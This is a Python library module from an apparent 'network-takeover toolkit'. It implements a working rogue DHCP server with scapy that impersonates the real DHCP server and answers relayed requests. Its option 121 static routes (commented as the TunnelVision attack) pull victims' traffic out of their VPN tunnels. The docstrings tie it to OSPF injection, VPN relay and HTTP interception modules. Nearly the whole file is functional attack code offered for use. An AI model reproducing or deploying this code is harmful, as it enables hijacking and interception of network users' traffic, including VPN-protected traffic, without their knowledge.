#!/usr/bin/env python3
# v3.2
"""
dhcp_takeover.py — DHCP engine for the network-takeover toolkit.

A library module (no orchestration of its own — see main.py).  Provides:

  Network setup (OSPF-derived):
    send_dhcpdiscover       Single untagged DHCPDISCOVER to find the real server.
    sniff_dhcpoffer         Capture the resulting DHCPOFFER (server IP + DNS).
    build_server_details_from_ospf  Assemble the server_details dict that the
                            rogue DHCP server consumes, populated with OSPF and
                            offer data.

  Rogue DHCP server:
    A full OFFER / ACK / NAK / RELEASE server with:
      * option 121 classless static routes (TunnelVision / VPN relay)
      * DNS mirrored from the real server's offer
"""
import ipaddress
import platform
import random
import shutil
import socket
import subprocess

from scapy.all import (
    BOOTP,
    DHCP,
    Dot1Q,
    Ether,
    IP,
    UDP,
    get_if_hwaddr,
    mac2str,
    sendp,
    sniff,
)

DEFAULT_SUBNET_MASK = "255.255.255.0"
DEFAULT_PREFIX_LENGTH = 24
MAX_DHCP_LEASE_TIME = 0xFFFFFFFF
DHCP_T1_FACTOR = 0.5
DHCP_T2_FACTOR = 0.875
DEFAULT_INTERFACE = "eth0"
DHCP_SNIFF_FILTER = "udp and (port 67 or 68) or (vlan and udp and (port 67 or 68))"
DHCP_DISCOVER_TYPES = {1, "discover"}
DHCP_OFFER_TYPES = {2, "offer"}
DHCP_REQUEST_TYPES = {3, "request"}
DHCP_NAK_TYPES = {6, "nak"}
DHCP_RELEASE_TYPES = {7, "release"}
LEASE_HOST_MIN = 2
LEASE_HOST_MAX = 253

# Four /2 routes cover the entire IPv4 space and are more specific than a VPN's
# typical /1 split-tunnel pair, so the kernel prefers them (TunnelVision attack).
# The gateway is filled in at runtime from server_details["source_ip"].
HIJACK_ROUTE_PREFIXES = [
    "0.0.0.0/2",
    "64.0.0.0/2",
    "128.0.0.0/2",
    "192.0.0.0/2",
]


def build_opt121(routes):
    """Encode classless static routes per RFC 3442.

    Each entry: [prefix_len][significant_net_octets][4-byte_gateway]
    A prefix of 0 (default route) contributes 0 network octets.
    When option 121 is present, RFC 3442-compliant clients MUST ignore option 3.
    """
    data = b""
    for net_cidr, gw in routes:
        net = ipaddress.IPv4Network(net_cidr, strict=False)
        prefix = net.prefixlen
        sig = (prefix + 7) // 8
        data += bytes([prefix]) + net.network_address.packed[:sig]
        data += ipaddress.IPv4Address(gw).packed
    return data


def print_step(status, message):
    print(f"[{status}] {message}", flush=True)


def run_command(description, command):
    print_step("START", description)
    try:
        subprocess.run(command, check=True)
    except subprocess.CalledProcessError as exc:
        print_step("FAIL", f"{description}: exit code {exc.returncode}")
        raise
    print_step("OK", description)


def iter_dhcp_options(packet):
    if not packet.haslayer(DHCP):
        return
    for option in packet[DHCP].options:
        if isinstance(option, tuple) and len(option) >= 2:
            yield option[0], option[1]


def get_dhcp_options(packet):
    options = {}
    for option_name, option_value in iter_dhcp_options(packet):
        options.setdefault(option_name, option_value)
    return options


def get_dhcp_option(packet, option_name):
    return next(
        (
            option_value
            for current_option_name, option_value in iter_dhcp_options(packet)
            if current_option_name == option_name
        ),
        None,
    )


def get_requested_address(packet):
    requested_address = get_dhcp_option(packet, "requested_addr")
    if requested_address is None:
        requested_address = get_dhcp_option(packet, "requested_ip_address")
    if requested_address is None:
        return None
    try:
        return str(ipaddress.IPv4Address(requested_address))
    except ValueError:
        print_step("SKIP", f"Ignoring invalid requested address {requested_address}")
        return None


def get_requested_or_client_address(packet):
    requested_address = get_requested_address(packet)
    if requested_address is not None:
        return requested_address
    client_address = packet[BOOTP].ciaddr
    if not client_address or client_address == "0.0.0.0":
        return None
    try:
        return str(ipaddress.IPv4Address(client_address))
    except ValueError:
        print_step("SKIP", f"Ignoring invalid client address {client_address}")
        return None


def is_dhcp_discover(packet):
    return get_dhcp_option(packet, "message-type") in DHCP_DISCOVER_TYPES


def is_dhcp_request(packet):
    return get_dhcp_option(packet, "message-type") in DHCP_REQUEST_TYPES


def get_offer_details(packet):
    """Extract useful details from a DHCPOFFER packet, including DNS."""
    bootp = packet[BOOTP]
    options = get_dhcp_options(packet)
    vlan_id = packet[Dot1Q].vlan if packet.haslayer(Dot1Q) else None
    server_id = options.get("server_id")
    src_ip = packet[IP].src if packet.haslayer(IP) else None

    return {
        "vlan": vlan_id,
        "offered_ip": bootp.yiaddr,
        "server_id": server_id,
        "router": options.get("router"),
        "subnet_mask": options.get("subnet_mask"),
        "lease_time": options.get("lease_time"),
        "dns": options.get("name_server"),
        "src_mac": packet[Ether].src if packet.haslayer(Ether) else None,
        "src_ip": src_ip,
        "dhcp_server_ip": server_id or src_ip,
        "xid": bootp.xid,
        "giaddr": bootp.giaddr,
    }


def get_first_ipv4_address(value):
    if value is None:
        return None
    values = value if isinstance(value, (list, tuple)) else [value]
    for item in values:
        try:
            return str(ipaddress.IPv4Address(item))
        except ValueError:
            continue
    return None



# ── OSPF-derived network setup ────────────────────────────────────────────────

def send_dhcpdiscover(interface):
    """Broadcast a single untagged DHCPDISCOVER to find the real DHCP server.

    No 802.1Q tag — we are a normal access-port client.  The switch relays the
    broadcast to the DHCP server via ip helper-address.
    """
    src_mac = get_if_hwaddr(interface)
    src_mac_bytes = mac2str(src_mac)
    xid = random.getrandbits(32)
    pkt = (
        Ether(dst="ff:ff:ff:ff:ff:ff", src=src_mac)
        / IP(src="0.0.0.0", dst="255.255.255.255")
        / UDP(sport=68, dport=67)
        / BOOTP(op=1, htype=1, hlen=6, xid=xid, chaddr=src_mac_bytes)
        / DHCP(options=[("message-type", "discover"), "end"])
    )
    sendp(pkt, iface=interface, verbose=False)
    print_step("OK", f"Sent untagged DHCPDISCOVER on {interface} xid={xid:#010x}")
    return xid


def sniff_dhcpoffer(interface, timeout=10):
    """Wait for a DHCPOFFER and return its parsed details, or None on timeout.

    Used after send_dhcpdiscover to learn the real DHCP server's IP (option 54)
    and DNS server (option 6) for use in our rogue server's responses.
    """
    result = []

    def _handle(pkt):
        if not (pkt.haslayer(BOOTP) and pkt.haslayer(DHCP)):
            return
        if get_dhcp_option(pkt, "message-type") not in DHCP_OFFER_TYPES:
            return
        result.append(get_offer_details(pkt))
        return True  # stop_filter

    print_step("START", f"Waiting {timeout}s for DHCPOFFER on {interface}")
    sniff(
        iface=interface,
        filter=DHCP_SNIFF_FILTER,
        store=False,
        timeout=timeout,
        stop_filter=lambda _: bool(result),
        prn=_handle,
    )
    if not result:
        print_step("WARN", "No DHCPOFFER received — server IP and DNS will be unknown")
        return None
    offer = result[0]
    print_step("OK", f"DHCPOFFER from server_id={offer['server_id']} dns={offer['dns']}")
    return offer


def build_server_details_from_ospf(interface, ospf_params, source_ip,
                                   offer=None, dns=None):
    """Build the server_details dict consumed by the rogue DHCP server.

    ospf_params  — learned from sniff_ospf_hellos (gives subnet + gateway).
    source_ip    — IP used as DHCP server_id (option 54); set to the real DHCP
                   server IP for impersonation.
    offer        — optional DHCPOFFER dict from sniff_dhcpoffer; populates dns.
    dns          — manual DNS override (takes precedence over offer).
    """
    netmask = ospf_params["netmask"]
    gateway = ospf_params["src_ip"]  # SVI IP = default gateway for this subnet
    network = ipaddress.IPv4Network(f"{gateway}/{netmask}", strict=False)
    resolved_dns = dns or (get_first_ipv4_address(offer.get("dns")) if offer else None)

    print_step(
        "OK",
        f"DHCP server details: server_id={source_ip} "
        f"gateway={gateway} network={network} dns={resolved_dns or 'unknown'}",
    )
    return {
        "interface":              interface,
        "source_ip":              source_ip,
        "gateway":                gateway,
        "netmask":                netmask,
        "dns":                    resolved_dns,
        "network":                network,
        "answered_request_xids":  set(),
        "opt121_subnets":         list(HIJACK_ROUTE_PREFIXES),
        "opt121_default_via_router": False,
    }




def get_interface_ipv4_addresses(interface, scope="global"):
    command = ["ip", "-4", "-o", "addr", "show", "dev", interface]
    if scope:
        command.extend(["scope", scope])
    result = subprocess.run(command, capture_output=True, text=True, check=False)
    if result.returncode != 0:
        print_step("WARN", f"ip addr show failed for {interface}: {result.stderr.strip()}")
        return []
    addresses = []
    for line in result.stdout.splitlines():
        parts = line.split()
        if "inet" in parts:
            inet_index = parts.index("inet")
            if inet_index + 1 < len(parts):
                addresses.append(parts[inet_index + 1])
    return addresses


def add_loopback_ipv4_address(address, prefix_length=32):
    """Add a /32 alias to loopback so the kernel accepts packets addressed to it.

    Required for cross-VLAN DHCP relay: the router sends relayed DHCP unicast to
    the real DHCP server IP.  Without this alias, the kernel sees a packet whose
    dst IP isn't ours, sends ICMP unreachable back to the relay agent, and the
    relay aborts.  With the alias, the kernel accepts the packet normally.
    """
    if platform.system().lower() != "linux":
        raise OSError("Loopback alias is only supported on Linux/Kali")
    if not shutil.which("ip"):
        raise FileNotFoundError("The Linux 'ip' command is required")
    ipaddress.IPv4Address(address)
    existing = [a.split("/")[0] for a in get_interface_ipv4_addresses("lo", scope=None)]
    if address in existing:
        print_step("OK", f"Loopback already has alias {address}")
        return
    run_command(
        f"Adding loopback alias {address}/{prefix_length} (accept relay packets)",
        ["ip", "addr", "add", f"{address}/{prefix_length}", "dev", "lo"],
    )
    run_command("Bringing loopback up", ["ip", "link", "set", "lo", "up"])


def remove_loopback_ipv4_address(address, prefix_length=32):
    """Remove the loopback alias added by add_loopback_ipv4_address()."""
    if platform.system().lower() != "linux" or not shutil.which("ip"):
        return
    subprocess.run(
        ["ip", "addr", "del", f"{address}/{prefix_length}", "dev", "lo"],
        capture_output=True, check=False,
    )
    print_step("OK", f"Removed loopback alias {address}")


def get_server_mac(server_details):
    server_mac = server_details.get("server_mac")
    if server_mac is None:
        server_mac = get_if_hwaddr(server_details["interface"])
        server_details["server_mac"] = server_mac
    return server_mac


def get_client_key(packet):
    bootp = packet[BOOTP]
    hlen = bootp.hlen or 6
    chaddr = bootp.chaddr
    if isinstance(chaddr, bytes):
        client_id = chaddr[:hlen].hex(":")
    else:
        client_id = str(chaddr)
    return (bootp.xid, client_id)


def get_proposed_lease_key(packet, dhcp_network):
    xid, client_id = get_client_key(packet)
    return (xid, client_id, "relay", str(dhcp_network["network"]))


def get_packet_vlan_id(packet):
    if packet.haslayer(Dot1Q):
        return packet[Dot1Q].vlan
    return None


def get_default_router_for_network(network, fallback_gateway=None):
    if fallback_gateway:
        return fallback_gateway
    if network.prefixlen == DEFAULT_PREFIX_LENGTH:
        return str(network.network_address + 1)
    return None


def get_relayed_client_network(giaddr, requested_address):
    # The relay agent's giaddr is authoritative for which subnet the client lives
    # on.  The requested address is only a preference WITHIN that subnet — we
    # never switch pools to match a stale preferred IP from a different subnet.
    relay_network = ipaddress.IPv4Network(f"{giaddr}/{DEFAULT_PREFIX_LENGTH}", strict=False)
    if requested_address:
        try:
            req_ip = ipaddress.IPv4Address(requested_address)
            if req_ip not in relay_network:
                print_step(
                    "WARN",
                    f"Client preferred {requested_address} is not in relay network "
                    f"{relay_network} (giaddr={giaddr}) — ignoring preference",
                )
        except ValueError:
            pass
    return relay_network


def get_or_add_dhcp_network(packet, networks):
    giaddr = packet[BOOTP].giaddr
    requested_address = get_requested_or_client_address(packet)
    vlan_id = get_packet_vlan_id(packet)

    network = get_relayed_client_network(giaddr, requested_address)
    network_key = ("relay", str(network))
    router = get_default_router_for_network(network, giaddr)
    excluded_addresses = {giaddr}
    if router:
        excluded_addresses.add(router)

    for dhcp_network in networks:
        if dhcp_network["key"] == network_key:
            dhcp_network["giaddr"] = giaddr
            dhcp_network["excluded_addresses"].add(giaddr)
            if router:
                dhcp_network["excluded_addresses"].add(router)
            if vlan_id is not None and dhcp_network.get("vlan_id") != vlan_id:
                print_step("OK", f"Updating relay network {network} vlan={vlan_id}")
                dhcp_network["vlan_id"] = vlan_id
            return dhcp_network

    dhcp_network = {
        "key": network_key,
        "giaddr": giaddr,
        "vlan_id": vlan_id,
        "network": network,
        "subnet_mask": DEFAULT_SUBNET_MASK,
        "router": router,
        "excluded_addresses": excluded_addresses,
        "leased_addresses": set(),
        "proposed_addresses": set(),
    }
    networks.append(dhcp_network)
    print_step("OK", f"Tracking relay network {network} vlan={vlan_id}")
    return dhcp_network


def is_lease_address_available(dhcp_network, address):
    network = dhcp_network["network"]
    try:
        ip_address = ipaddress.IPv4Address(address)
    except ValueError:
        return False
    if ip_address not in network:
        return False
    host_number = int(ip_address) - int(network.network_address)
    if not LEASE_HOST_MIN <= host_number <= LEASE_HOST_MAX:
        return False
    address = str(ip_address)
    if address in dhcp_network["excluded_addresses"]:
        return False
    if address in dhcp_network["leased_addresses"]:
        return False
    if address in dhcp_network["proposed_addresses"]:
        return False
    return True


def is_requested_lease_address_usable(dhcp_network, address):
    network = dhcp_network["network"]
    try:
        ip_address = ipaddress.IPv4Address(address)
    except ValueError:
        return False
    if ip_address not in network:
        return False
    host_number = int(ip_address) - int(network.network_address)
    if not LEASE_HOST_MIN <= host_number <= LEASE_HOST_MAX:
        return False
    return str(ip_address) not in dhcp_network["excluded_addresses"]


def reserve_lease_address(dhcp_network, address):
    dhcp_network["proposed_addresses"].add(address)
    print_step("OK", f"Reserved proposed lease {address} on {dhcp_network['network']}")
    return address


def lease_next_available_address(dhcp_network, requested_address=None):
    network = dhcp_network["network"]
    if requested_address and is_lease_address_available(dhcp_network, requested_address):
        return reserve_lease_address(dhcp_network, requested_address)
    if requested_address:
        print_step("SKIP", f"Requested lease {requested_address} is unavailable on {network}")
    for host_number in range(LEASE_HOST_MIN, LEASE_HOST_MAX + 1):
        candidate = str(network.network_address + host_number)
        if is_lease_address_available(dhcp_network, candidate):
            return reserve_lease_address(dhcp_network, candidate)
    print_step("FAIL", f"No free lease available on {network}")
    return None


def get_dns_for_response(server_details):
    """Return the DNS server to advertise, mirrored from the real server's offer."""
    return server_details.get("dns")


def build_dhcp_response(packet, message_type, offered_ip, dhcp_network, server_ip, server_mac=None, server_details=None):
    """Build a DHCPOFFER or DHCPACK with DNS (from legit server) and option 121 route injection."""
    bootp = packet[BOOTP]
    giaddr = dhcp_network["giaddr"]
    subnet_mask = dhcp_network["subnet_mask"]
    router = dhcp_network["router"]
    vlan_id = dhcp_network.get("vlan_id")
    lease_time = MAX_DHCP_LEASE_TIME

    # Per RFC 3442: the next-hop for each classless static route MUST be on the
    # same subnet as the client's interface.  giaddr is the relay agent's
    # client-facing SVI IP — always on-link for the victim.  OSPF stub injection
    # for opt121_subnets makes the SVI route that traffic back to us.
    #
    # Per RFC 3442: when option 121 is present, RFC-compliant clients MUST ignore
    # option 3.  Omitting option 3 when option 121 covers the default forces
    # correct behaviour on non-compliant clients.
    opt121_routes = []
    if server_details is not None:
        for subnet in server_details.get("opt121_subnets", []):
            opt121_routes.append((subnet, giaddr))
        if server_details.get("opt121_default_via_router") and router:
            opt121_routes.append(("0.0.0.0/0", router))

    # option 121 has a default route if any entry is /0 or 0.0.0.0/0
    opt121_has_default = any(
        str(cidr).startswith("0.0.0.0/0") or cidr == "0.0.0.0/0"
        for cidr, _ in opt121_routes
    )

    dhcp_options = [
        ("message-type", message_type),
        ("server_id", server_ip),
        ("subnet_mask", subnet_mask),
    ]

    # DNS: mirror the legitimate server's DNS so clients get working resolution.
    if server_details is not None:
        dns = get_dns_for_response(server_details)
        if dns:
            dhcp_options.append(("name_server", dns))

    # Omit option 3 when option 121 already covers the default route — prevents
    # non-RFC-compliant clients from installing both and having the VPN override.
    if router and not opt121_has_default:
        dhcp_options.append(("router", router))

    if opt121_routes:
        dhcp_options.append((121, build_opt121(opt121_routes)))

    dhcp_options.extend(
        [
            ("lease_time", lease_time),
            ("renewal_time", int(lease_time * DHCP_T1_FACTOR)),
            ("rebinding_time", int(lease_time * DHCP_T2_FACTOR)),
            "end",
        ]
    )

    response = (
        IP(src=server_ip, dst=giaddr)
        / UDP(sport=67, dport=67)
        / BOOTP(
            op=2,
            xid=bootp.xid,
            yiaddr=offered_ip,
            siaddr=server_ip,
            giaddr=giaddr,
            chaddr=bootp.chaddr,
            flags=bootp.flags,
        )
        / DHCP(options=dhcp_options)
    )

    if packet.haslayer(Ether):
        ether = Ether(src=server_mac, dst=packet[Ether].src)
        if vlan_id is not None:
            response = ether / Dot1Q(vlan=vlan_id) / response
        else:
            response = ether / response

    return response


def build_dhcp_nak(packet, server_ip, server_mac, vlan_id=None):
    """Build a DHCPNAK broadcast response.  NAK is always sent to the broadcast address per RFC 2131."""
    bootp = packet[BOOTP]
    dhcp_options = [
        ("message-type", "nak"),
        ("server_id", server_ip),
        "end",
    ]
    response = (
        IP(src=server_ip, dst="255.255.255.255")
        / UDP(sport=67, dport=68)
        / BOOTP(op=2, xid=bootp.xid, chaddr=bootp.chaddr)
        / DHCP(options=dhcp_options)
    )
    if packet.haslayer(Ether):
        ether = Ether(src=server_mac, dst="ff:ff:ff:ff:ff:ff")
        if vlan_id is not None:
            response = ether / Dot1Q(vlan=vlan_id) / response
        else:
            response = ether / response
    return response


def log_built_dhcp_response(label, packet):
    dst_mac = packet[Ether].dst if packet.haslayer(Ether) else None
    dst_ip = packet[IP].dst if packet.haslayer(IP) else None
    print_step(
        "OK",
        f"Built {label} dst_mac={dst_mac} dst_ip={dst_ip} vlan={get_packet_vlan_id(packet)}",
    )


def offer_address_to_discover(packet, networks, proposed_leases, server_details):
    """Respond to a DHCPDISCOVER with a DHCPOFFER and return the offered IP."""
    if not packet.haslayer(BOOTP) or not is_dhcp_discover(packet):
        print_step("SKIP", "Packet is not a DHCPDISCOVER")
        return None

    giaddr = packet[BOOTP].giaddr
    print_step("START", f"Processing DHCPDISCOVER xid={packet[BOOTP].xid} giaddr={giaddr}")
    dhcp_network = get_or_add_dhcp_network(packet, networks)

    lease_key = get_proposed_lease_key(packet, dhcp_network)
    existing_offer = proposed_leases.get(lease_key)
    requested_address = get_requested_address(packet)
    offered_ip = (
        existing_offer["ip_address"]
        if existing_offer
        else lease_next_available_address(dhcp_network, requested_address)
    )
    if offered_ip is None:
        return None

    server_ip = server_details["source_ip"]
    proposed_leases[lease_key] = {
        "ip_address": offered_ip,
        "key": lease_key,
    }

    offer_packet = build_dhcp_response(
        packet,
        "offer",
        offered_ip,
        dhcp_network,
        server_ip,
        get_server_mac(server_details),
        server_details=server_details,
    )
    log_built_dhcp_response("DHCPOFFER", offer_packet)
    print_step("START", f"Sending DHCPOFFER {offered_ip} to relay {giaddr}")
    sendp(offer_packet, iface=server_details["interface"], verbose=False)
    print_step("OK", f"Sent DHCPOFFER {offered_ip}")
    return offered_ip


def ack_request(packet, networks, proposed_leases, server_details):
    """Respond to a DHCPREQUEST with a DHCPACK, sending NAK when invalid."""
    if not packet.haslayer(BOOTP) or not is_dhcp_request(packet):
        print_step("SKIP", "Packet is not a DHCPREQUEST")
        return None

    bootp = packet[BOOTP]
    answered_xids = server_details.setdefault("answered_request_xids", set())
    if bootp.xid in answered_xids:
        print_step("SKIP", f"Ignoring DHCPREQUEST xid={bootp.xid} because it was already answered")
        return None

    print_step("START", f"Processing DHCPREQUEST xid={bootp.xid} giaddr={bootp.giaddr}")
    dhcp_network = get_or_add_dhcp_network(packet, networks)
    server_ip = server_details["source_ip"]
    server_mac = get_server_mac(server_details)
    vlan_id = dhcp_network.get("vlan_id")

    lease_key = get_proposed_lease_key(packet, dhcp_network)
    proposed_lease = proposed_leases.get(lease_key)
    requested_ip = get_requested_or_client_address(packet)

    if proposed_lease is None:
        offered_ip = requested_ip
        if offered_ip is None:
            print_step("FAIL", "Ignoring DHCPREQUEST with no requested or client address")
            return None
        if not is_requested_lease_address_usable(dhcp_network, offered_ip):
            print_step("FAIL", f"Sending DHCPNAK: requested lease {offered_ip} is unavailable")
            nak_packet = build_dhcp_nak(packet, server_ip, server_mac, vlan_id)
            log_built_dhcp_response("DHCPNAK", nak_packet)
            sendp(nak_packet, iface=server_details["interface"], verbose=False)
            return None
        print_step("OK", f"Accepting first DHCPREQUEST xid={bootp.xid} for {offered_ip} without prior offer")
    else:
        offered_ip = proposed_lease["ip_address"]

    if requested_ip is not None and requested_ip != offered_ip:
        print_step("FAIL", f"Sending DHCPNAK: client requested {requested_ip} but we proposed {offered_ip}")
        nak_packet = build_dhcp_nak(packet, server_ip, server_mac, vlan_id)
        log_built_dhcp_response("DHCPNAK", nak_packet)
        sendp(nak_packet, iface=server_details["interface"], verbose=False)
        return None

    ack_packet = build_dhcp_response(
        packet,
        "ack",
        offered_ip,
        dhcp_network,
        server_ip,
        server_mac,
        server_details=server_details,
    )
    log_built_dhcp_response("DHCPACK", ack_packet)
    print_step("START", f"Sending DHCPACK {offered_ip} to relay {dhcp_network['giaddr']}")
    sendp(ack_packet, iface=server_details["interface"], verbose=False)
    print_step("OK", f"Sent DHCPACK {offered_ip}")

    dhcp_network["proposed_addresses"].discard(offered_ip)
    dhcp_network["leased_addresses"].add(offered_ip)
    proposed_leases.pop(lease_key, None)
    answered_xids.add(bootp.xid)
    print_step("OK", f"Recorded DHCP lease {offered_ip}")
    return offered_ip


def handle_dhcp_release(packet, networks):
    """Free a released IP back to its network's lease pool."""
    if not packet.haslayer(BOOTP):
        return None

    released_ip = packet[BOOTP].ciaddr
    if not released_ip or released_ip == "0.0.0.0":
        return None

    released_ip = str(released_ip)
    for dhcp_network in networks:
        if released_ip in dhcp_network["leased_addresses"]:
            dhcp_network["leased_addresses"].discard(released_ip)
            dhcp_network["proposed_addresses"].discard(released_ip)
            print_step("OK", f"Released {released_ip} on {dhcp_network['network']}")
            return released_ip

    print_step("SKIP", f"DHCPRELEASE for {released_ip}: address not in any lease pool")
    return None


def handle_dhcp_client_packet(packet, networks, proposed_leases, server_details):
    """Dispatch DHCPDISCOVER, DHCPREQUEST, DHCPRELEASE, and DHCPNAK; return a result dict or None."""
    if packet[BOOTP].giaddr == "0.0.0.0":
        print_step("SKIP", "Ignoring direct DHCP packet (not relayed)")
        return None
    message_type = get_dhcp_option(packet, "message-type")

    if message_type in DHCP_DISCOVER_TYPES:
        offered_ip = offer_address_to_discover(packet, networks, proposed_leases, server_details)
        if offered_ip:
            bootp = packet[BOOTP]
            return {
                "message_type": "discover",
                "action": "offer",
                "ip_address": offered_ip,
                "xid": bootp.xid,
                "giaddr": bootp.giaddr,
            }

    if message_type in DHCP_REQUEST_TYPES:
        leased_ip = ack_request(packet, networks, proposed_leases, server_details)
        if leased_ip:
            bootp = packet[BOOTP]
            return {
                "message_type": "request",
                "action": "ack",
                "ip_address": leased_ip,
                "xid": bootp.xid,
                "giaddr": bootp.giaddr,
            }

    if message_type in DHCP_RELEASE_TYPES:
        released_ip = handle_dhcp_release(packet, networks)
        if released_ip:
            bootp = packet[BOOTP]
            return {
                "message_type": "release",
                "action": "release",
                "ip_address": released_ip,
                "xid": bootp.xid,
                "giaddr": bootp.giaddr,
            }

    if message_type in DHCP_NAK_TYPES:
        xid = packet[BOOTP].xid
        for key in list(proposed_leases):
            if key[0] == xid:
                entry = proposed_leases.pop(key)
                for net in networks:
                    net["proposed_addresses"].discard(entry["ip_address"])
                print_step("OK", f"Discarded pending offer {entry['ip_address']} after real server NAK xid={xid:#010x}")
        return None

    return None


def bind_dhcp_udp_guard(address="0.0.0.0"):
    guard_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    guard_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        guard_socket.bind((address, 67))
    except OSError:
        guard_socket.close()
        raise
    print_step("OK", f"Bound UDP/67 guard socket on {address}")
    return guard_socket


def sniff_for_dhcp_discover_and_request(networks, proposed_leases, server_details, timeout=None, count=0):
    handled_events = []

    def handle_packet(packet):
        result = handle_dhcp_client_packet(packet, networks, proposed_leases, server_details)
        if result:
            handled_events.append(result)
            print_step("OK", f"Handled DHCP {result['message_type']} with {result['action']} {result['ip_address']}")

    print_step("START", f"Sniffing DHCPDISCOVER/DHCPREQUEST/DHCPRELEASE packets on {server_details['interface']}")
    guard_socket = bind_dhcp_udp_guard()
    try:
        sniff(
            iface=server_details["interface"],
            filter=DHCP_SNIFF_FILTER,
            lfilter=lambda packet: packet.haslayer(DHCP) and packet.haslayer(BOOTP),
            prn=handle_packet,
            store=False,
            timeout=timeout,
            count=count,
        )
    finally:
        guard_socket.close()
    print_step("OK", f"Finished DHCP client sniff loop with {len(handled_events)} handled event(s)")
    return handled_events



# This module is a library — the orchestration that used to live in main() now
# lives in main.py, which wires dhcp_takeover, ospf_adjacency, vpn_relay, and
# http_intercept together.
if __name__ == "__main__":
    print_step(
        "FAIL",
        "dhcp_takeover.py is a library module. Run the toolkit via:  sudo python3 main.py",
    )
